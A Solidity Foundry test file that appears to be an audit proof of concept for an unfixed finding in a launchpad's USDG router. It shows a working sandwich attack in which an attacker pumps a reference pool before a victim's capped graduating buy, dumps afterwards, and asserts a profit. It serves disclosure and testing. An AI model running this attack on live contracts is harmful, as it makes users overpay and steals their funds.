// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

// OPEN FINDING (docs/audit-2026-11-14.md): this test demonstrates a vulnerability that is NOT fixed yet and
// passes while it exists. When the fix lands, invert its assertions into a regression test.

// RT-01 PoC. Place in contracts/test/ and run:
//   forge test --match-contract RT01_UsdgRefundSandwich -vv
//
// Claim: on a non-USDG-quoted coin, a buyWithUsdg whose curve leg is CAPPED (the graduating buy, or a holding-cap
// partial fill) has no effective slippage protection. tokensOut is fixed by the cap, so `minTokensOut` always passes,
// while the USDG->quote leg and the quote->USDG refund leg run with no price bound. An attacker who pumps the
// USDG/quote reference pool before the victim (and dumps after) makes the victim pay far more USDG for the SAME tokens.

import {console2} from "forge-std/console2.sol";
import {IntegrationBase} from "./integration/IntegrationBase.sol";
import {Token} from "../src/Token.sol";
import {BondingCurve} from "../src/BondingCurve.sol";

contract RT01_UsdgRefundSandwich is IntegrationBase {
    BondingCurve internal sCurve;
    Token internal sTok;
    address internal victim = makeAddr("victim");
    address internal attacker = makeAddr("attacker");

    function setUp() public override {
        super.setUp();
        router.setUsdgRouting(address(quote), address(launchpad)); // test contract deployed the router (owner)
        router.setUsdgPool(address(strategy), strategyUsdgKey);
        // Same setting as UsdgRouter.t.sol::test_graduatingBuyThroughRouter (the curve hop near graduation).
        router.setMaxImpactBps(100_000);
        (sCurve, sTok) = _launchWithQuote(address(strategy), 0, 0);
        _warpPastSnipe();
        // Fill ~90% of the curve with direct buys (same loop as test_graduatingBuyThroughRouter).
        for (uint256 i; i < 80 && sCurve.progressBps() < 9000; ++i) {
            address w = makeAddr(string(abi.encodePacked("w", vm.toString(i))));
            strategy.mint(w, 1000 ether);
            vm.startPrank(w);
            strategy.approve(address(sCurve), 1000 ether);
            try sCurve.buy(400 ether, 0, block.timestamp + 1 hours) {} catch {}
            vm.stopPrank();
        }
        quote.mint(victim, 100_000 * U);
        quote.mint(attacker, 1_000_000 * U);
        vm.prank(victim);
        quote.approve(address(router), type(uint256).max);
        vm.startPrank(attacker);
        quote.approve(address(router), type(uint256).max);
        strategy.approve(address(router), type(uint256).max);
        vm.stopPrank();
    }

    function test_cappedBuy_refundLeg_isSandwichable() public {
        uint256 usdgIn = 6000 * U; // more than the ~2.2K the curve still needs: the buy graduates and refunds
        uint256 dl = block.timestamp + 1 hours;
        (uint256 quoted,) = router.quoteUsdgRouteFor(victim, address(sTok), true, usdgIn);
        uint256 minOut = quoted * 99 / 100; // frontend rule: quote less 1% slippage

        uint256 snap = vm.snapshotState();

        // ── honest execution ──
        uint256 u0 = quote.balanceOf(victim);
        vm.prank(victim);
        uint256 outHonest = router.buyWithUsdg(address(sTok), usdgIn, minOut, dl);
        uint256 spentHonest = u0 - quote.balanceOf(victim);
        assertTrue(sCurve.graduated(), "the victim's buy graduates the curve (capped output)");

        vm.revertToState(snap);

        // ── sandwiched execution ──
        uint256 a0 = quote.balanceOf(attacker);
        vm.prank(attacker);
        uint256 sBought = router.swapUsdgToQuote(address(strategy), 10_000 * U, 1, attacker, dl); // front-run: pump quote

        u0 = quote.balanceOf(victim);
        vm.prank(victim);
        uint256 outAttacked = router.buyWithUsdg(address(sTok), usdgIn, minOut, dl); // same minOut: does NOT revert
        uint256 spentAttacked = u0 - quote.balanceOf(victim);

        vm.prank(attacker);
        router.swapQuoteToUsdg(address(strategy), sBought, 1, attacker, dl); // back-run: dump quote
        uint256 a1 = quote.balanceOf(attacker);

        console2.log("tokens honest / attacked", outHonest, outAttacked);
        console2.log("USDG spent honest", spentHonest);
        console2.log("USDG spent attacked", spentAttacked);
        console2.log("attacker profit (USDG wei)", a1 > a0 ? a1 - a0 : 0);

        assertEq(outAttacked, outHonest, "same tokens: minTokensOut gives no protection");
        assertGt(spentAttacked, spentHonest + spentHonest / 10, "victim overpays > 10% for the same tokens");
        assertGt(a1, a0, "the sandwich is profitable");
    }
}
